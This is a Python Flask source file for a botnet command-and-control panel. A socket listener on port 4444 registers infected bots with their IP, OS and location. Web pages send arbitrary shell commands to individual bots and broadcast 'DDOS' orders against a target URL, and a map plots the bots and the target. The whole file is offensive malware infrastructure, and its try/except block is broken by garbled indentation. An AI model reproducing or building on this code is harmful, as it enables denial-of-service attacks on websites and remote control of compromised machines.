from flask import Flask, request, render_template_string, redirect, url_for
import sqlite3
import threading
import socket
from geopy.geocoders import Nominatim

DATABASE = 'bots.db'
SOCKET_PORT = 4444

app = Flask(__name__)

# Map connections between bots
connections = {}

# Data about the current attack
current_attack = {"target_url": "", "rounds": 0, "target_coords": (0, 0)}

# Initialize the database
def init_db():
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            ip TEXT UNIQUE,
                            os TEXT,
                            lat REAL,
                            lon REAL,
                            status TEXT,
                            files TEXT
                          )''')
        conn.commit()

# Run the database initialization
init_db()

# Socket handler to manage bot connections
def socket_handler():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', SOCKET_PORT))
    server_socket.listen(5)
    print(f"[Socket] Listening on port {SOCKET_PORT}...")

    while True:
        client_socket, client_address = server_socket.accept()
        ip = client_address[0]
        print(f"[Socket] New connection from {ip}")
        connections[ip] = client_socket

        try:
    # Receive metadata from the bot
    metadata = client_socket.recv(1024).decode('utf-8')

    # Validate the metadata format
    parts = metadata.split('|')
    if len(parts) != 3:
        print(f"[Socket] Invalid metadata format: {metadata}")
        client_socket.close()
        continue

    # Unpack the metadata
    os_info, lat, lon = parts
    lat = float(lat)
    lon = float(lon)
    
    # Process the metadata (e.g., store in the database)
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO bots (ip, os, lat, lon, status, files)
            VALUES (?, ?, ?, ?, ?, ?)
            ON CONFLICT(ip) DO UPDATE SET
            os=excluded.os, lat=excluded.lat, lon=excluded.lon,
            status='Online', files=excluded.files
        """, (ip, os_info, lat, lon, 'Online', ''))
        conn.commit()

except ValueError as e:
    print(f"[Socket] Error parsing metadata: {e}")
    client_socket.close()

def get_target_coordinates(target_url):
    """
    Fetch the latitude and longitude of the target URL using GeoPy.
    """
    try:
        geolocator = Nominatim(user_agent="attack_geolocation")
        location = geolocator.geocode(target_url)
        if location:
            return (location.latitude, location.longitude)
        else:
            print(f"[GeoPy] Unable to find location for: {target_url}")
            return (0, 0)
    except Exception as e:
        print(f"[GeoPy] Error fetching coordinates: {e}")
        return (0, 0)

@app.route('/')
def index():
    """
    Displays a list of bots.
    """
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM bots")
        bots = cursor.fetchall()

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Bot List</title>
    </head>
    <body>
        <h1>Bot List</h1>
        <table border="1">
            <tr>
                <th>ID</th>
                <th>IP</th>
                <th>OS</th>
                <th>Latitude</th>
                <th>Longitude</th>
                <th>Status</th>
                <th>Actions</th>
            </tr>
            {% for bot in bots %}
            <tr>
                <td>{{ bot[0] }}</td>
                <td>{{ bot[1] }}</td>
                <td>{{ bot[2] }}</td>
                <td>{{ bot[3] }}</td>
                <td>{{ bot[4] }}</td>
                <td>{{ bot[5] }}</td>
                <td><a href="{{ url_for('bot_overview', bot_id=bot[0]) }}">Details</a></td>
            </tr>
            {% endfor %}
        </table>
        <a href="/map">View Map</a>
        <a href="/attack">Initiate Attack</a>
    </body>
    </html>
    """
    return render_template_string(html, bots=bots)

@app.route('/bot/<int:bot_id>', methods=['GET', 'POST'])
def bot_overview(bot_id):
    """
    Displays details about a bot and allows sending commands.
    """
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM bots WHERE id = ?", (bot_id,))
        bot = cursor.fetchone()

    if not bot:
        return "Bot not found", 404

    if request.method == 'POST':
        command = request.form.get('command')
        client_socket = connections.get(bot[1])
        if client_socket:
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
        else:
            output = "Bot is not online."

        return render_template_string(bot_overview_html, bot=bot, output=output)

    return render_template_string(bot_overview_html, bot=bot, output="")

bot_overview_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Bot Details</title>
</head>
<body>
    <h1>Bot Details {{ bot[1] }}</h1>
    <p><strong>OS:</strong> {{ bot[2] }}</p>
    <p><strong>Status:</strong> {{ bot[5] }}</p>
    <h2>Files</h2>
    <pre>{{ bot[6] }}</pre>
    <h2>CLI</h2>
    <form method="post">
        <label for="command">Command:</label>
        <input type="text" id="command" name="command">
        <button type="submit">Send</button>
    </form>
    <h3>Output:</h3>
    <pre>{{ output }}</pre>
    <a href="/">Back to Bot List</a>
</body>
</html>
"""

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    """
    Page to initiate and manage an attack.
    """
    global current_attack

    if request.method == 'POST':
        # Get the target URL and request count
        target_url = request.form['target_url']
        rounds = int(request.form['rounds'])

        # Get the coordinates of the target server
        target_coords = get_target_coordinates(target_url)
        current_attack = {"target_url": target_url, "rounds": rounds, "target_coords": target_coords}

        # Send attack commands to all bots
        for ip, client_socket in connections.items():
            try:
                client_socket.send(f"DDOS {target_url} {rounds}".encode('utf-8'))
            except Exception as e:
                print(f"[Error] Could not send command to bot {ip}: {e}")

        return redirect('/attack')

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Attack</title>
    </head>
    <body>
        <h1>Attack</h1>
        <form method="post">
            <label for="target_url">Target URL:</label>
            <input type="text" id="target_url" name="target_url" required>
            <br>
            <label for="rounds">Request Count:</label>
            <input type="number" id="rounds" name="rounds" min="1" required>
            <br>
            <button type="submit">Initiate Attack</button>
        </form>
        <h2>Current Attack</h2>
        <p><strong>Target:</strong> {{ current_attack.target_url }}</p>
        <p><strong>Request Count:</strong> {{ current_attack.rounds }}</p>
        <p><strong>Target Coordinates:</strong> {{ current_attack.target_coords }}</p>
        <a href="/">Back to Bot List</a>
    </body>
    </html>
    """
    return render_template_string(html, current_attack=current_attack)

@app.route('/map')
def map_view():
    """
    Displays the map of bots and attack connections.
    """
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT ip, lat, lon, status FROM bots")
        bots = cursor.fetchall()

    bot_list = [
        {"ip": bot[0], "lat": float(bot[1]), "lon": float(bot[2]), "status": bot[3]}
        for bot in bots
    ]

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Bot Map</title>
        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    </head>
    <body>
        <h1>Bot Map</h1>
        <div id="map" style="height: 80vh; width: 100%;"></div>
        <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
        <script>
            const map = L.map('map').setView([20, 0], 2);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                maxZoom: 19,
                attribution: '© OpenStreetMap contributors'
            }).addTo(map);

            const bots = {{ bots | tojson }};
            const target = {{ current_attack | tojson }};

            // Display bots
            bots.forEach(bot => {
                const marker = L.circleMarker([bot.lat, bot.lon], {
                    color: bot.status === "Online" ? "green" : "red",
                    radius: 8
                }).addTo(map);
                marker.bindPopup(`<b>${bot.ip}</b><br>${bot.status}`);
            });

            // Draw attack connections
            if (target.target_url) {
                bots.forEach(bot => {
                    if (bot.status === "Online") {
                        L.polyline([
                            [bot.lat, bot.lon],
                            [target.target_coords[0], target.target_coords[1]]
                        ], { color: 'orange' }).addTo(map);
                    }
                });

                // Mark the target
                L.marker([target.target_coords[0], target.target_coords[1]], { color: "blue" })
                 .addTo(map)
                 .bindPopup(`<b>Target:</b> ${target.target_url}`);
            }
        </script>
        <a href="/">Back to Bot List</a>
    </body>
    </html>
    """
    return render_template_string(html, bots=bot_list, current_attack=current_attack)

if __name__ == '__main__':
    threading.Thread(target=socket_handler, daemon=True).start()
    app.run(host='0.0.0.0', port=9999)
